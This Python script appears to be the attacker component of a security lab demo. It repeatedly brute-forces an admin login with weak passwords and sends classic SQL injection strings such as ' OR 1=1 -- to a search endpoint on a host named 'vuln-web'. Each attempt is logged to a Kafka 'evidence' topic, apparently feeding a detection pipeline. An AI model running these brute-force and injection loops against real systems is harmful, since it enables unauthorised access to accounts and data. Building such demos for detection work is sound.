import time
import json
import requests
import os
from kafka import KafkaProducer

KAFKA_BROKER = os.environ.get('KAFKA_BROKER', 'kafka:9092')
TOPIC = 'evidence_topic'

LOGIN_URL = 'http://vuln-web:5000/login'
SEARCH_URL = 'http://vuln-web:5000/search'

def get_producer():
    while True:
        try:
            producer = KafkaProducer(
                bootstrap_servers=[KAFKA_BROKER],
                value_serializer=lambda x: json.dumps(x).encode('utf-8')
            )
            return producer
        except:
            time.sleep(5)

# --- 修复点：增加了 http_status 参数 ---
def send_evidence(producer, attack_type, target, payload, success, http_status=0):
    evidence = {
        "timestamp": time.time(),
        "attack_type": attack_type,
        "target": target,
        "payload": payload,
        "result": "success" if success else "fail",
        "http_status": http_status  # 补上了这个字段
    }
    producer.send(TOPIC, value=evidence)
    producer.flush()
    print(f"[*] 发送证据: [{attack_type}] {payload} -> {evidence['result']}")

def run_brute_force(producer):
    print("\n--- 启动模块: 弱口令暴力破解 ---")
    passwords = ["123456", "password", "admin", "admin123"]
    for password in passwords:
        try:
            resp = requests.post(LOGIN_URL, json={"username": "admin", "password": password}, timeout=2)
            success = (resp.status_code == 200)
            # 传入状态码
            send_evidence(producer, "brute_force", LOGIN_URL, password, success, http_status=resp.status_code)
            if success: break
        except: pass
        time.sleep(0.5)

def run_sql_injection(producer):
    print("\n--- 启动模块: SQL 注入探测 ---")
    sqli_payloads = ["admin", "test_user", "' OR '1'='1", "' OR 1=1 --"]
    for payload in sqli_payloads:
        try:
            resp = requests.get(SEARCH_URL, params={"q": payload}, timeout=2)
            success = (resp.status_code == 200)
            if success:
                print(f"!!! 发现 SQL 注入漏洞 !!!")
            # 传入状态码
            send_evidence(producer, "sql_injection", SEARCH_URL, payload, success, http_status=resp.status_code)
        except: pass
        time.sleep(1)

if __name__ == '__main__':
    producer = get_producer()
    print("攻击者服务已就绪...")
    while True:
        run_brute_force(producer)
        time.sleep(2)
        run_sql_injection(producer)
        # 缩短等待时间，让演示更流畅
        print("\n=== 等待下一轮攻击循环 (3秒) ===")
        time.sleep(3)
